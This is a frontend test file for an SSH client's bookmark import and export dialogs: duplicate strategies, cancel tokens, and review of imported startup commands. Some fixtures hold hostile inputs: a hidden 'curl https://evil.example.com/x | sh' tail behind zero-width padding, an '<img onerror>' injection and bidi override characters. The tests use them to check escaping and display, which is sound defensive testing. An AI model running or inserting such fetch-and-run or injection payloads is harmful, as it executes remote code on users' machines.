// Bookmark import / export (ARCHITECTURE §7.7, §8.10): actions, options dialogs, native dialog calls, summaries.
import { act, screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { setBackend } from "../../ipc";
import { ACTION_IDS, MENUS } from "../../lib/actionIds";
import { settleApp, setupApp } from "../../test/harness";
import { useStore } from "../../state/store";
import { actionEnabled, runAction } from "../actions/registry";
import { useMenuStore } from "../menu/menuStore";

afterEach(async () => {
  await settleApp(60);
  useMenuStore.getState().close();
  setBackend(null);
  vi.restoreAllMocks();
});

describe("actions", () => {
  it("are in the registry and in the File menu", () => {
    expect(ACTION_IDS).toContain("importBookmarks");
    expect(ACTION_IDS).toContain("exportBookmarks");
    expect(MENUS.file).toContain("importBookmarks");
    expect(MENUS.file).toContain("exportBookmarks");
  });

  it("File menu and the Bookmarks panel header menu both offer them", async () => {
    const { user } = setupApp();
    const bar = screen.getByRole("menubar", { name: "Application menu" });
    await user.click(within(bar).getByRole("menuitem", { name: "File" }));
    const fileMenu = await screen.findByRole("menu", { name: "File" });
    expect(within(fileMenu).getByRole("menuitem", { name: /Import bookmarks…/ })).toBeTruthy();
    expect(within(fileMenu).getByRole("menuitem", { name: /Export bookmarks…/ })).toBeTruthy();
    await user.keyboard("{Escape}");

    await user.click(screen.getByRole("button", { name: "More bookmark actions" }));
    await user.click(await screen.findByRole("menuitem", { name: "Export bookmarks…" }));
    expect(await screen.findByRole("dialog", { name: "Export bookmarks" })).toBeTruthy();
  });

  it("import is disabled while the bookmark store is read-only", () => {
    setupApp();
    const dto = useStore.getState().bookmarks;
    if (!dto) throw new Error("no bookmarks");
    act(() => useStore.getState().setBookmarks({ ...dto, readOnly: true }));
    expect(actionEnabled("importBookmarks")).toBe(false);
    expect(actionEnabled("exportBookmarks")).toBe(true);
  });
});

describe("import", () => {
  it("opens the native dialog right away, reviews the file, then applies with the chosen strategy and summarises", async () => {
    const { user, backend } = setupApp();
    const existing = useStore.getState().bookmarks?.bookmarks[0];
    if (!existing) throw new Error("no bookmark");
    const before = useStore.getState().bookmarks?.bookmarks.length ?? 0;
    backend.importFile = {
      bookmarks: [
        { name: existing.name, host: "other.example.com" },
        { name: "brand-new", host: "new.example.com" },
      ],
      invalid: [
        { entry: "bookmark", index: 4, field: "host", code: "missing" },
        { entry: "group", index: 0, field: "name", code: "invalid" },
      ],
    };
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    expect(backend.importOpenCalls).toEqual(["Import bookmarks"]); // the file dialog came first
    expect(backend.importApplyCalls).toHaveLength(0);
    expect(useStore.getState().bookmarks?.bookmarks.length).toBe(before); // nothing saved yet

    expect(within(dialog).getByText("The file contains 2 bookmarks.")).toBeTruthy();
    expect(within(dialog).getByText("1 bookmark in the file has the same name as an existing one.")).toBeTruthy();
    expect(dialog.textContent).toContain("Bookmark 5: host is missing");
    expect(dialog.textContent).toContain("Group 1: name has an invalid value");
    expect(within(dialog).getByText(/The existing bookmark is kept/)).toBeTruthy();
    await user.selectOptions(within(dialog).getByLabelText("If a bookmark with the same name exists"), "Keep both");
    expect(within(dialog).getByText(/“prod \(2\)”/)).toBeTruthy();
    expect(within(dialog).getByText(/Passwords are never imported/)).toBeTruthy();
    await user.click(within(dialog).getByRole("button", { name: "Import" }));

    expect(backend.importApplyCalls).toHaveLength(1);
    expect(backend.importApplyCalls[0]).toMatchObject({ strategy: "duplicate", keepStartupCommands: false });
    expect(backend.importCancelCalls).toHaveLength(0);
    const summary = await screen.findByRole("dialog", { name: "Import finished" });
    expect(summary.textContent).toContain("2 bookmarks added");
    expect(summary.textContent).toContain("0 bookmarks replaced");
    expect(summary.textContent).toContain("0 bookmarks skipped");
    expect(summary.textContent).toContain("2 entries rejected");
    expect(summary.textContent).toContain("Bookmark 5: host is missing");
    expect(summary.textContent).toContain("Group 1: name has an invalid value");
    // The store follows the result without a reload.
    const names = useStore.getState().bookmarks?.bookmarks.map((b) => b.name) ?? [];
    expect(names).toContain("brand-new");
    expect(names).toContain(`${existing.name} (2)`);
  });

  it("skip leaves the existing bookmark and counts it; replace overwrites it", async () => {
    const { user, backend } = setupApp();
    const existing = useStore.getState().bookmarks?.bookmarks[0];
    if (!existing) throw new Error("no bookmark");
    backend.importFile = { bookmarks: [{ name: existing.name, host: "changed.example.com" }] };

    act(() => runAction("importBookmarks"));
    let dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.click(within(dialog).getByRole("button", { name: "Import" }));
    let summary = await screen.findByRole("dialog", { name: "Import finished" });
    expect(summary.textContent).toContain("1 bookmark skipped");
    expect(useStore.getState().bookmarks?.bookmarks.find((b) => b.id === existing.id)?.host).toBe(existing.host);
    await user.click(within(summary).getByRole("button", { name: "Close" }));

    act(() => runAction("importBookmarks"));
    dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.selectOptions(within(dialog).getByLabelText("If a bookmark with the same name exists"), "Replace the existing one");
    await user.click(within(dialog).getByRole("button", { name: "Import" }));
    summary = await screen.findByRole("dialog", { name: "Import finished" });
    expect(summary.textContent).toContain("1 bookmark replaced");
    expect(useStore.getState().bookmarks?.bookmarks.find((b) => b.id === existing.id)?.host).toBe("changed.example.com");
  });

  it("a cancelled native dialog shows nothing", async () => {
    const { backend } = setupApp();
    backend.importFile = null;
    act(() => runAction("importBookmarks"));
    await waitFor(() => expect(backend.importOpenCalls).toHaveLength(1));
    await settleApp(20);
    expect(screen.queryByRole("dialog")).toBeNull();
  });

  it("a refused file is reported as a notice, no dialog opens and nothing is imported", async () => {
    const { backend } = setupApp();
    const before = useStore.getState().bookmarks?.bookmarks.length;
    backend.importFile = { code: "importInvalidFile", params: { reason: "notJson" } };
    vi.spyOn(console, "error").mockImplementation(() => undefined);
    act(() => runAction("importBookmarks"));
    await waitFor(() => expect(backend.importOpenCalls).toHaveLength(1));
    await settleApp(20);
    expect(screen.queryByRole("dialog", { name: "Import bookmarks" })).toBeNull();
    expect(useStore.getState().notices.length).toBeGreaterThan(0);
    expect(useStore.getState().bookmarks?.bookmarks.length).toBe(before);
  });

  it("Cancel, Escape and the close button drop the pending import with its token", async () => {
    const { user, backend } = setupApp();
    for (const how of ["cancel", "escape", "close"] as const) {
      act(() => runAction("importBookmarks"));
      const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
      if (how === "cancel") await user.click(within(dialog).getByRole("button", { name: "Cancel" }));
      else if (how === "escape") await user.keyboard("{Escape}");
      else await user.click(within(dialog).getByRole("button", { name: "Close" }));
      await waitFor(() => expect(screen.queryByRole("dialog", { name: "Import bookmarks" })).toBeNull());
    }
    expect(backend.importCancelCalls).toHaveLength(3);
    expect(new Set(backend.importCancelCalls).size).toBe(3); // one token per open
    expect(backend.importApplyCalls).toHaveLength(0);
  });

  it("an apply error is reported in the dialog; the consumed import cannot be retried", async () => {
    const { user, backend } = setupApp();
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await backend.bookmarksImportOpen("again"); // another open replaced the pending import: the token is stale
    await user.click(within(dialog).getByRole("button", { name: "Import" }));
    await waitFor(() => expect(backend.importApplyCalls).toHaveLength(1));
    expect(screen.queryByRole("dialog", { name: "Import finished" })).toBeNull();
    expect(dialog.querySelector(".dialog__error")?.textContent).toBe("This import is no longer valid. Open the file again.");
    expect(within(dialog).getByRole("button", { name: "Import" }).hasAttribute("disabled")).toBe(true);
    const closers = within(dialog).getAllByRole("button", { name: "Close" }); // header button and the footer one
    expect(closers).toHaveLength(2);
    await user.click(closers[1] as HTMLElement);
    expect(screen.queryByRole("dialog", { name: "Import bookmarks" })).toBeNull();
    expect(backend.importCancelCalls).toHaveLength(0); // already consumed by the attempt
  });
});

describe("import: startup commands", () => {
  const RLO = String.fromCodePoint(0x202e);
  const ZWSP = String.fromCodePoint(0x200b);

  it("shows no checkbox when the file has no startup commands", async () => {
    const { backend } = setupApp();
    backend.importFile = { bookmarks: [{ name: "plain", host: "p.example.com" }] };
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    expect(within(dialog).queryByRole("checkbox")).toBeNull();
  });

  it("offers an unchecked checkbox; Import without it removes the commands", async () => {
    const { user, backend } = setupApp();
    backend.importFile = { bookmarks: [{ name: "with-cmd", host: "a.example.com", startupCommand: "uptime" }] };
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    const box = within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" });
    expect((box as HTMLInputElement).checked).toBe(false);
    expect(within(dialog).getByText(/Off by default/)).toBeTruthy();
    expect(within(dialog).queryByRole("alert")).toBeNull();
    expect(within(dialog).queryByRole("list", { name: "Bookmarks with startup commands" })).toBeNull();
    await user.click(within(dialog).getByRole("button", { name: "Import" }));

    expect(backend.importApplyCalls[0]).toMatchObject({ keepStartupCommands: false });
    const summary = await screen.findByRole("dialog", { name: "Import finished" });
    expect(within(summary).getByRole("list", { name: "Bookmarks without their startup command" }).textContent).toBe("with-cmd");
    expect(useStore.getState().bookmarks?.bookmarks.find((b) => b.name === "with-cmd")?.startupCommand).toBeNull();
  });

  it("checking the box shows the warning and the list; Import keeps the commands", async () => {
    const { user, backend } = setupApp();
    backend.importFile = {
      bookmarks: [
        { name: "with-cmd", host: "a.example.com", startupCommand: "cd /srv && ls" },
        { name: "clean", host: "b.example.com" },
      ],
    };
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
    expect(within(dialog).getByRole("alert").textContent).toContain("Only keep them if you trust this file");
    const list = within(dialog).getByRole("list", { name: "Bookmarks with startup commands" });
    expect(list.querySelectorAll("li")).toHaveLength(1);
    expect(list.querySelector("bdi")?.textContent).toBe("with-cmd");
    expect(list.querySelector("code")?.textContent).toBe("cd /srv && ls");
    await user.click(within(dialog).getByRole("button", { name: "Import" }));

    expect(backend.importApplyCalls[0]).toMatchObject({ keepStartupCommands: true });
    await screen.findByRole("dialog", { name: "Import finished" });
    expect(useStore.getState().bookmarks?.bookmarks.find((b) => b.name === "with-cmd")?.startupCommand).toBe("cd /srv && ls");
    expect(screen.queryByText("Bookmarks without their startup command")).toBeNull();
  });

  it("marks an existing name as skipped under skip and as replacing under replace, unmarked under keep both", async () => {
    const { user, backend } = setupApp();
    const existing = useStore.getState().bookmarks?.bookmarks[0];
    if (!existing) throw new Error("no bookmark");
    backend.importFile = {
      bookmarks: [
        { name: existing.name, host: "x.example.com", startupCommand: "top" },
        { name: "fresh", host: "y.example.com", startupCommand: "ls" },
      ],
    };
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
    const list = () => within(dialog).getByRole("list", { name: "Bookmarks with startup commands" });
    const items = () => Array.from(list().querySelectorAll("li"));

    expect(items()[0]?.textContent).toContain("skipped: a bookmark with this name exists");
    expect(items()[1]?.textContent).not.toContain("skipped");
    await user.selectOptions(within(dialog).getByLabelText("If a bookmark with the same name exists"), "Replace the existing one");
    expect(items()[0]?.textContent).toContain("replaces the existing bookmark");
    expect(items()[1]?.textContent).not.toContain("replaces");
    await user.selectOptions(within(dialog).getByLabelText("If a bookmark with the same name exists"), "Keep both");
    expect(items()[0]?.textContent).not.toContain("(");
  });

  it("renders a hostile name and command as escaped text", async () => {
    const { user, backend } = setupApp();
    backend.importFile = {
      bookmarks: [{ name: `<b>x</b>${RLO}`, host: "a.example.com", startupCommand: `echo${RLO}${ZWSP} <img src=x onerror=1>` }],
    };
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
    expect(dialog.textContent).not.toContain(RLO);
    expect(dialog.textContent).not.toContain(ZWSP);
    expect(dialog.textContent).toContain("⟨U+202E⟩");
    expect(dialog.textContent).toContain("⟨U+200B⟩");
    expect(dialog.querySelector("b")).toBeNull();
    expect(dialog.querySelector("img")).toBeNull();
  });

  it("never cuts a command: the tail behind zero-width padding stays visible", async () => {
    const { user, backend } = setupApp();
    const tail = "; curl https://evil.example.com/x | sh";
    backend.importFile = { bookmarks: [{ name: "padded", host: "a.example.com", startupCommand: `htop ${ZWSP.repeat(150)}${tail}` }] };
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
    const shown = within(dialog).getByRole("list", { name: "Bookmarks with startup commands" }).querySelector("code")?.textContent ?? "";
    expect(shown.endsWith(tail)).toBe(true);
    expect(shown).not.toContain("…");
    expect(shown).not.toContain(ZWSP);
  });

  it("drops the pending import when the dialog vanishes without its close handler, exactly once", async () => {
    const { backend } = setupApp();
    act(() => runAction("importBookmarks"));
    await screen.findByRole("dialog", { name: "Import bookmarks" });
    act(() => useStore.getState().closeDialog("bookmarksImport")); // not through Cancel / Escape
    await waitFor(() => expect(backend.importCancelCalls).toHaveLength(1));
    await settleApp(20);
    expect(backend.importCancelCalls).toHaveLength(1);
  });

  it("does not cancel again after Cancel, nor after an apply", async () => {
    const { user, backend } = setupApp();
    act(() => runAction("importBookmarks"));
    let dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.click(within(dialog).getByRole("button", { name: "Cancel" }));
    await settleApp(20);
    expect(backend.importCancelCalls).toHaveLength(1);

    act(() => runAction("importBookmarks"));
    dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.click(within(dialog).getByRole("button", { name: "Import" }));
    const summary = await screen.findByRole("dialog", { name: "Import finished" });
    await user.click(within(summary).getAllByRole("button", { name: "Close" })[0] as HTMLElement);
    await settleApp(20);
    expect(backend.importCancelCalls).toHaveLength(1);
  });

  it("the importStartupCommands scenario drives the review dialog", async () => {
    const { user } = setupApp({ scenario: "importStartupCommands" });
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
    expect(within(dialog).getByRole("list", { name: "Bookmarks with startup commands" }).querySelectorAll("li")).toHaveLength(3);
  });
});

describe("export", () => {
  it("explains that passwords are never exported, passes the format and summarises", async () => {
    const { user, backend } = setupApp();
    act(() => runAction("exportBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Export bookmarks" });
    expect(within(dialog).getByText(/Passwords are never exported/)).toBeTruthy();
    await user.selectOptions(within(dialog).getByLabelText("Format"), "OpenSSH config");
    expect(within(dialog).getByText(/Groups, tags, colors, start folders and speed limits cannot be stored/)).toBeTruthy();
    backend.exportOutcome = {
      fileName: "shellfin-ssh-config",
      count: 0,
      skipped: [
        { name: "prod", field: "color", code: "notRepresentable" },
        { name: "dev", field: "startDir", code: "unsafeValue" },
      ],
    };
    await user.click(within(dialog).getByRole("button", { name: "Export…" }));

    expect(backend.exportCalls).toEqual([{ format: "sshConfig", dialogTitle: "Export bookmarks" }]);
    const summary = await screen.findByRole("dialog", { name: "Bookmarks exported" });
    expect(summary.textContent).toMatch(/\d+ bookmarks? w(as|ere) saved to shellfin-ssh-config/);
    expect(summary.textContent).toContain("Passwords are never exported");
    expect(summary.textContent).toContain("prod: color cannot be stored in this format");
    expect(summary.textContent).toContain("dev: startDir contains characters that are not allowed");
  });

  it("shows names with bidi or control characters escaped, never as markup", async () => {
    const { user, backend } = setupApp();
    act(() => runAction("exportBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Export bookmarks" });
    backend.exportOutcome = {
      fileName: "a‮b.json",
      count: 1,
      skipped: [{ name: "<img src=x onerror=1>‮\u0007", field: "color", code: "notRepresentable" }],
    };
    await user.click(within(dialog).getByRole("button", { name: "Export…" }));
    const summary = await screen.findByRole("dialog", { name: "Bookmarks exported" });
    expect(summary.textContent).not.toContain("‮");
    expect(summary.textContent).not.toContain("\u0007");
    expect(summary.textContent).toContain("⟨U+202E⟩");
    expect(summary.querySelector("img")).toBeNull();
  });

  it("a cancelled save dialog shows no summary", async () => {
    const { user, backend } = setupApp();
    backend.exportOutcome = null;
    act(() => runAction("exportBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Export bookmarks" });
    await user.click(within(dialog).getByRole("button", { name: "Export…" }));
    await waitFor(() => expect(backend.exportCalls).toHaveLength(1));
    expect(screen.queryByRole("dialog", { name: "Bookmarks exported" })).toBeNull();
  });
});
